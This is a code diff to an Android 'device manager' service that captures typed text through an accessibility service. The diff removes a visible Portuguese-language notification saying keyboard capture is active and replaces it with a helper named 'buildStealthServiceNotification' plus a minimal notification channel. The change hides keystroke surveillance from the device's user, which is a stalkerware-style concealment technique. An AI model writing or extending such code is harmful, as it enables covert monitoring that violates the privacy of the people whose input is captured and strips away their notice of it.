@@ -1,15 +1,13 @@
 package com.company.devicemgr.services;
 
 import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
-import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 
+import com.company.devicemgr.utils.ForegroundNotificationHelper;
 import com.company.devicemgr.utils.InAppTextCaptureManager;
 
 public class InAppTextCaptureService extends Service {
@@ -62,35 +60,14 @@ public class InAppTextCaptureService extends Service {
     }
 
     private Notification buildNotification() {
-        String content = "Captura de teclado ativa com consentimento permanente da instalação. " + InAppTextCaptureManager.buildStatusSummary(this);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            return new Notification.Builder(this, CHANNEL_ID)
-                    .setContentTitle("Captura de texto por acessibilidade")
-                    .setContentText(content)
-                    .setStyle(new Notification.BigTextStyle().bigText(content))
-                    .setSmallIcon(android.R.drawable.ic_menu_edit)
-                    .setOngoing(true)
-                    .build();
-        }
-        return new Notification.Builder(this)
-                .setContentTitle("Captura de texto por acessibilidade")
-                .setContentText(content)
-                .setStyle(new Notification.BigTextStyle().bigText(content))
-                .setSmallIcon(android.R.drawable.ic_menu_edit)
-                .setOngoing(true)
-                .build();
+        return ForegroundNotificationHelper.buildStealthServiceNotification(
+                this,
+                CHANNEL_ID,
+                android.R.drawable.ic_menu_edit
+        );
     }
 
     private void createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                    CHANNEL_ID,
-                    "Captura de texto por acessibilidade",
-                    NotificationManager.IMPORTANCE_LOW
-            );
-            channel.setDescription("Notificação persistente para a captura de texto via serviço de acessibilidade com consentimento permanente da instalação.");
-            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-            if (manager != null) manager.createNotificationChannel(channel);
-        }
+        ForegroundNotificationHelper.ensureMinChannel(this, CHANNEL_ID, "Captura de texto por acessibilidade");
     }
 }
